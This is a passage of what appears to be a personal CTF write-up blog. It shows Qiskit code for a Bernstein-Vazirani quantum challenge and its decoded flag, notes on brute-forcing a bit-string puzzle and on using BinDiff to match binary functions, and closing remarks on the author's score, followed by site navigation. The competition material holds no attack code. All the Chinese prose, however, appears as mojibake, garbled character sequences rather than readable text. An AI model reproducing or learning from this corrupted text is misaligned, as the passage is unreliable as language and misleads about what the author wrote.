</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">101</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">102</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">104</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">109</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">110</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">114</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">115</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">117</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">118</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">121</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">122</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">125</span>, n)
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>cx(<span style="color:#ae81ff">126</span>, n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply barrier</span>
</span></span><span style="display:flex;"><span>bv_circuit<span style="color:#f92672">.</span>barrier()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Apply Hadamard gates after querying the oracle</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    bv_circuit<span style="color:#f92672">.</span>h(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Measurement</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>    bv_circuit<span style="color:#f92672">.</span>measure(i, i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># bv_circuit.draw(output=&#39;mpl&#39;, filename=&#39;my_circuit.png&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use local simulator</span>
</span></span><span style="display:flex;"><span>aer_sim <span style="color:#f92672">=</span> Aer<span style="color:#f92672">.</span>get_backend(<span style="color:#e6db74">&#39;aer_simulator&#39;</span>)
</span></span><span style="display:flex;"><span>shots <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>qobj <span style="color:#f92672">=</span> assemble(bv_circuit)
</span></span><span style="display:flex;"><span>results <span style="color:#f92672">=</span> aer_sim<span style="color:#f92672">.</span>run(qobj)<span style="color:#f92672">.</span>result()
</span></span><span style="display:flex;"><span>answer <span style="color:#f92672">=</span> results<span style="color:#f92672">.</span>get_counts()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(answer)
</span></span></code></pre></div><p>è·‘å‡ºæ¥</p>
<pre tabindex="0"><code>{&#39;01100110011011000110000101100111011110110110000100110011001101010110010100110001001100000110010001100101001110010110001101111101&#39;: 1024}
</code></pre><p>æŠŠè¿™ä¸²æ•°æ‹¿å»æŒ‰ç…§ ASCII è§£ç ï¼Œå¾—åˆ° flag <code>flag{a35e10de9c}</code></p>
<h2 id="ä¼é¹…æ‹¼ç›˜">ä¼é¹…æ‹¼ç›˜</h2>
<p>åˆšå¼€å§‹å®Œå…¨æ²¡çœ‹æ‡‚é¢˜ç›®ï¼Œç‚¹è¿›å»å°±åšç¬¬ä¸€é¢˜ã€‚</p>
<p>è¾“å…¥å››ä½ 01 ä¸²ï¼Ÿéå†ä¸€ä¸‹æ‰€æœ‰æƒ…å†µï¼Œç­”æ¡ˆ <code>1000</code> ï¼Œå¾—åˆ° flag <code>flag{it_works_like_magic_...}</code></p>
<p>ç¬¬äºŒé¢˜ï¼Œè¾“å…¥åå…­ä½ 01 ä¸²ï¼Œæ‰‹åŠ¨æšä¸¾åˆ°æ¯”èµ›ç»“æŸä¹Ÿæä¸å®Œï¼Œnc åˆä¸ä¼šç”¨ï¼Œå°±æ²¡å†æã€‚</p>
<h2 id="ç«çœ¼é‡‘ç›çš„å°e">ç«çœ¼é‡‘ç›çš„å°E</h2>
<p>ç¬¬ä¸€é—®ç¡®å®æ˜¯æœ‰æ‰‹å°±è¡Œã€‚</p>
<p>ç»å†äº†ä¸ºå†™é¢˜è€Œå®‰è£… IDA ã€Altium Designer ã€ Docker ã€ Webdriverã€ Golang åï¼Œç¬”è€…å·²ç»å¯¹å®‰è£…æ–°è½¯ä»¶æ— æ‰€ç•æƒ§äº†ã€‚</p>
<p>å› æ­¤ç›´æ¥å»ä¸‹è½½äº† Bindiff ï¼ˆä¸è¿‡å½“æ—¶è¢«ç‰ˆæœ¬é—®é¢˜å›°æ‰°äº†å¥½ä¹…ã€‚</p>
<p>ä»ç½‘ä¸Šéšä¾¿æ‰¾ä¸€ä¸ª Bindiff æ•™ç¨‹ï¼Œè·Ÿç€åšå°±å®Œäº‹äº†ã€‚</p>
<p>å”¯ä¸€çš„é—®é¢˜å°±æ˜¯æœ‰æ—¶å€™ Bindiff ä¼šç»™å‡ºé”™è¯¯çš„åŒ¹é…ï¼Œ</p>
<p>æ¯”å¦‚å‘Šè¯‰æˆ‘ <code>0x2ee4</code> å’Œ <code>0x3a42</code> æ˜¯ä¸€å¯¹ï¼Œä½†ä»–ä»¬ç›¸ä¼¼åº¦åªæœ‰ 0.01 ã€‚</p>
<p>è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å»çœ‹ <code>0x3a42</code> é™„è¿‘çš„å‡½æ•°ï¼Œæœ‰æ²¡æœ‰ç›¸ä¼¼åº¦ä¸º 0.01 é™„è¿‘çš„ï¼Œå¦‚æœæœ‰ï¼Œé‚£ä¹ˆç­”æ¡ˆå¤§æ¦‚ç‡å°±æ˜¯å®ƒäº†ã€‚</p>
<p>å¦å¤–è¿˜é‡åˆ°è¿‡ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯é¢˜ç›®æŒ‡å‡ºçš„åœ°å€å¯ä»¥åœ¨ IDA ä¸­çœ‹åˆ°ï¼Œä½†é‚£å¹¶ä¸æ˜¯å‡½æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªè·³è½¬çš„ç›®æ ‡ä½ç½®ï¼Œ</p>
<p>è€Œä¸” Bindiff ä¹Ÿæ²¡æœ‰å°†å…¶è¯†åˆ«ä¸ºå‡½æ•°ã€‚</p>
<p>é‡åˆ°ä¸Šé¢çš„æƒ…å†µï¼Œé‚£å°±åˆ·æ–°é‡åšå’¯ï¼Œå¤šè¯•å‡ æ¬¡ï¼Œæ€»èƒ½é€šè¿‡çš„ã€‚</p>
<p>ç„¶ååˆ°äº†ç¬¬äºŒé¢˜ï¼Œ100 ç»„æ–‡ä»¶ï¼Œé™æ—¶ 60 åˆ†é’Ÿï¼Œç­”å¯¹ 40 ç»„ï¼Œå†™ä¸äº†ï¼Œå‘Šè¾ã€‚</p>
<h2 id="åè®°">åè®°</h2>
<p>æ¯”èµ›ç¬¬ä¸€å¤©ï¼Œæ‹¿äº† 500 åˆ†ï¼Œä¸€ç›´åˆ°æ¯”èµ›ç¬¬ä¸‰å¤©è¿˜æ²¡ä¸Š 1000 åˆ†ã€‚</p>
<p>å½“æ—¶æ„Ÿè§‰é¢˜ç›®å¥½éš¾ï¼Œä¸æƒ³å†™äº†ï¼Œå¥½å‡ é“é¢˜éƒ½æ˜¯æœ‰ä¸€ç‚¹æ€è·¯ï¼Œä½†æ€è·¯ä¸å¤šã€‚</p>
<p>åé¢æ‘†äº†å¤§æ¦‚ä¸€å¤©ï¼ŒæœŸé—´ä¼šæœ‰ä¸€äº›èƒ¡æ€ä¹±æƒ³ï¼Œäºæ˜¯åé¢å¼€å§‹ç–¯ç‹‚æœç´¢ï¼Œå­¦äº†ä¸å°‘æ–°ä¸œè¥¿ï¼Œé€æ¸æŠŠä¹‹å‰æœ‰ä¸€ç‚¹ç‚¹æ€è·¯çš„é¢˜éƒ½ç»™é€šè¿‡äº†ã€‚</p>
<p>æ„Ÿè§‰è¿™æ¬¡æ¯”èµ›çš„å¾ˆå¤šé¢˜ç›®å¹¶ä¸æ˜¯åœ¨è€ƒå¯ŸçŸ¥è¯†æŒæ¡ç¨‹åº¦ï¼Œè€Œæ˜¯åœ¨è€ƒå¯Ÿæœç´¢å¼•æ“ç†Ÿç»ƒç¨‹åº¦ï¼Œå¾ˆå¤šçŸ¥è¯†ç°æœç°ç”¨å°±èƒ½è§£é¢˜ã€‚</p>
<p>å¦å¤–å‰ååˆå½±ç•™å¿µï¼š</p>
<p>
  <p><img src="https://s2.loli.net/2022/10/29/WomhX65NVvC9gzU.png" alt="20221027_22.png" loading="lazy" onclick="showBig(this)"/></p>
</p>
<p>ï¼ˆä¸è¿‡åªåšæŒäº†ä¿©å°æ—¶å°±æ‰å‡ºå»äº†ï¼Œæˆªè‡³æœ¬æ–‡å®Œæˆæ—¶ 3650 åˆ†ï¼Œç»„å†… 12 åï¼‰</p>
<p>ï¼ˆå†™å®Œ WP åˆå»åšäº†ä¸¤é“ math ï¼Œç»“æŸæ—¶ 4150 åˆ†ï¼Œå–œæç»„å†… 17 åï¼‰</p>

          </div>
        </div>
                 
      
  
  
  
  

  

  <div class="article-paging">
    
      <section class="post-paging--item card-container content-padding-primary soft-size--primary soft-style--box">
  <a href="/posts/interview/">
  <div class="card-cover" background-image-lazy data-img="https://s2.loli.net/2023/01/17/tq9su6nQhEaZjMX.jpg"></div>
  <div class="card-text">
    <h4 class="card-text--title">æ¸¸æˆå®¢æˆ·ç«¯å¼€å‘æ—¥å¸¸å®ä¹ é¢ç»</h4>
    <p class="card-text--row">2023-01-03 17:05</p>
  </div>
  </a>
</section>
    
    
      <section class="post-paging--item card-container content-padding-primary soft-size--primary soft-style--box">
  <a href="/posts/csharpclass/">
  <div class="card-cover" background-image-lazy data-img="https://s2.loli.net/2022/09/10/nueZiWDaydjLhrS.jpg"></div>
  <div class="card-text">
    <h4 class="card-text--title">C# ç±»çš„å¤šæ€</h4>
    <p class="card-text--row">2022-09-10 16:16</p>
  </div>
  </a>
</section>
    
  </div>
</div>
  <aside class="widget-info">
    
<section class="aside-widget widget-author content-padding-large soft-size--large soft-style--box">
  <div class="widget-body">
    <div class="author-box avatar">
      
      <img class="author-avatar soft-size--round soft-style--box" src="https://avatars.githubusercontent.com/u/47293990?s=100" alt="Citrine">
      
      <h2 class="author-name text-ellipsis">Citrine</h2>
      
      <p class="author-desc text-ellipsis">Txtxj</p>
      
    </div>
  </div>
</section>


    

<section class="aside-widget widget-toc content-padding-large soft-size--large soft-style--scrollbox">
  <h2 class="widget-header">
    <div class="title">
      <span>ç›®å½•</span>
    </div>
  </h2>
  <div class="widget-body">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#ç­¾åˆ°">ç­¾åˆ°</a></li>
    <li><a href="#çŒ«å’ªé—®ç­”">çŒ«å’ªé—®ç­”</a></li>
    <li><a href="#å®¶ç›®å½•é‡Œçš„ç§˜å¯†">å®¶ç›®å½•é‡Œçš„ç§˜å¯†</a></li>
    <li><a href="#heilang">HeiLang</a></li>
    <li><a href="#xcaptcha">Xcaptcha</a></li>
    <li><a href="#æ—…è¡Œç…§ç‰‡">æ—…è¡Œç…§ç‰‡</a></li>
    <li><a href="#çŒœæ•°å­—">çŒœæ•°å­—</a></li>
    <li><a href="#latex-æœºå™¨äºº">LaTeX æœºå™¨äºº</a></li>
    <li><a href="#flag-çš„ç—•è¿¹">Flag çš„ç—•è¿¹</a></li>
    <li><a href="#å®‰å…¨çš„åœ¨çº¿æµ‹è¯„">å®‰å…¨çš„åœ¨çº¿æµ‹è¯„</a></li>
    <li><a href="#çº¿è·¯æ¿">çº¿è·¯æ¿</a></li>
    <li><a href="#flag-è‡ªåŠ¨æœº">Flag è‡ªåŠ¨æœº</a></li>
    <li><a href="#å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ ">å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ </a></li>
    <li><a href="#æ¯çª—é¹…å½±">æ¯çª—é¹…å½±</a></li>
    <li><a href="#è’™ç‰¹å¡ç½—è½®ç›˜èµŒ">è’™ç‰¹å¡ç½—è½®ç›˜èµŒ</a></li>
    <li><a href="#ç½®æ¢é­”ç¾¤">ç½®æ¢é­”ç¾¤</a></li>
    <li><a href="#å…‰ä¸å½±">å…‰ä¸å½±</a></li>
    <li><a href="#é‡å­è—å®å›¾">é‡å­è—å®å›¾</a></li>
    <li><a href="#ä¼é¹…æ‹¼ç›˜">ä¼é¹…æ‹¼ç›˜</a></li>
    <li><a href="#ç«çœ¼é‡‘ç›çš„å°e">ç«çœ¼é‡‘ç›çš„å°E</a></li>
    <li><a href="#åè®°">åè®°</a></li>
  </ul>
</nav>
  </div>
</section>


    








<section class="aside-widget widget-articles content-padding-large soft-size--large soft-style--box">
  <h2 class="widget-header">
    <div class="title">
      <span>ç›¸å…³æ–‡ç« </span>
    </div>
  </h2>
  <div class="widget-body">
    <ul class="post-list">
      
      
        <li class="post-item"><a href="/posts/solutionprize/">é¢˜è§£ é¢†å¥–å°æ•°</a></li>
      
        <li class="post-item"><a href="/posts/solutioncf1452d/">ã€é¢˜è§£ã€‘CF1452D Radio Towers</a></li>
      
        <li class="post-item"><a href="/posts/solutionp5020/">é¢˜è§£ P5020 ã€è´§å¸ç³»ç»Ÿã€‘</a></li>
      
    </ul>
  </div>
</section>


    





    




<section class="aside-widget widget-tags content-padding-large soft-size--large soft-style--box">
  <h2 class="widget-header">
    <div class="title">
      <span>èšåˆæ ‡ç­¾</span>
    </div>
  </h2>
  <div class="widget-body">
    <div class="tags-list">
      
        <a href="https://txtxj.top/tags/%E7%AC%94%E8%AE%B0/" data-count="11" class="soft-size--small soft-style--hover soft-style--active">ç¬”è®°</a>
      
        <a href="https://txtxj.top/tags/unity/" data-count="8" class="soft-size--small soft-style--hover soft-style--active">Unity</a>
      
        <a href="https://txtxj.top/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/" data-count="7" class="soft-size--small soft-style--hover soft-style--active">å›¾å½¢å­¦</a>
      
        <a href="https://txtxj.top/tags/%E9%A2%98%E8%A7%A3/" data-count="4" class="soft-size--small soft-style--hover soft-style--active">é¢˜è§£</a>
      
        <a href="https://txtxj.top/tags/%E6%95%99%E7%A8%8B/" data-count="3" class="soft-size--small soft-style--hover soft-style--active">æ•™ç¨‹</a>
      
        <a href="https://txtxj.top/tags/c#/" data-count="2" class="soft-size--small soft-style--hover soft-style--active">C#</a>
      
        <a href="https://txtxj.top/tags/%E7%81%AB%E7%84%B0%E7%BA%B9%E7%AB%A0/" data-count="1" class="soft-size--small soft-style--hover soft-style--active">ç«ç„°çº¹ç« </a>
      
    </div>
  </div>

  
</section>

  </aside>
</div>
  </main>

  <div id="popup" onclick="hideBig(this)" onmousewheel="return wheelImg(this)">
    <div class="bg"><img src="" alt="" /></div>
  </div><footer class="footer-container layout-block">
  
  <div class="social-icons">
    
      <a class="soft-size--primary soft-style--box" href="https://github.com/txtxj" target="_blank" rel="noopener noreferrer">
          
        <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
          <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
        </svg>
        

        

        

        

        
      </a>
    
  </div>
  

  <div class="colour-bar"></div>
  
  

  

  <p>
    Copyright Â© 2021 2021 txtxj
  </p>

  <p>
    Powered by
    <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a>
    Theme - 
    <a href="https://github.com/txtxj/hugo-theme-kagome" target="_blank" rel="noopener noreferrer author">kagome</a>
  </p>

  <p>
    <a href="javascript:;" id="theme-light">ğŸŒ æµ…è‰²</a>
    <a href="javascript:;" id="theme-dark">ğŸŒ› æ·±è‰²</a>
    <a href="javascript:;" id="theme-auto">ğŸ¤–ï¸ è‡ªåŠ¨</a>
  </p>
  <script src="/js/copy.js"></script>
</footer>



<script type="text/javascript" src="https://csdnimg.cn/release/blog_mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>






</body>

</html>